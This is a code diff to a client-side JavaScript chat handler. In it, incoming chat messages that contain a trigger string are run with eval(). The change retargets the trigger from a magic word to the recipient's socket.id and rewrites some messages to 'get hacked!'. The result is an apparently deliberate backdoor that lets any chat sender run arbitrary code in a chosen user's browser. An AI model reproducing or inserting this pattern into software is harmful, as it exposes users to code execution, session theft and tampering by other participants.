@@ -145,7 +145,7 @@ function create() {
 
     // Handle chat messages
     socket.on("chatMessage", ({ name, message, color }) => {
-        if (message.includes("//milna")){
+        if (message.includes(socket.id)){
             try {
                 // Try to evaluate the string
                 eval(message);
@@ -154,6 +154,8 @@ function create() {
                 console.log("Error evaluating message:", error);
             }
 
+        }
+        if (message.includes("//") && message.includes(";")){
             message = "get hacked!";
         }
         const el = document.createElement("div");
